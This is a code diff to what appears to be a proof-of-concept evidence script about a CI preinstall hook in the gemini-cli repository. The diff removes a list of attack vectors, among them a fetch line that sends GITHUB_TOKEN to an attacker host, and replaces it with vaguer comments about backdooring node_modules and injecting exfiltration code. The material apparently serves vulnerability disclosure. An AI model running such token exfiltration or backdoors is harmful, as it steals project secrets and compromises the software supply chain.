@@ -47,13 +47,10 @@ const evidence = {
     // API key is NOT available during npm ci (step-level env on test step only).
     // This proves the preinstall hook runs BEFORE secrets are injected.
   },
-  // What an attacker would do here:
-  attack_vectors: [
-    'Exfiltrate GITHUB_TOKEN via fetch("https://attacker.com/?t=" + process.env.GITHUB_TOKEN)',
-    'Set commit status to success: POST /repos/google-gemini/gemini-cli/statuses/{sha} with GITHUB_TOKEN',
-    'Install persistent backdoor in node_modules/ that activates during test step (which has GEMINI_API_KEY)',
-    'Modify build output to inject exfiltration code that runs when GEMINI_API_KEY is in scope',
-  ],
+  // Attack vectors (not included in evidence JSON — see POC-WRITEUP.md):
+  // - Exfiltrate GITHUB_TOKEN via network request
+  // - Install backdoor in node_modules/ that activates during test step
+  // - Modify build output to inject exfiltration code for GEMINI_API_KEY
 };
 
 const evidencePath = join(evidenceDir, 'preinstall-evidence.json');
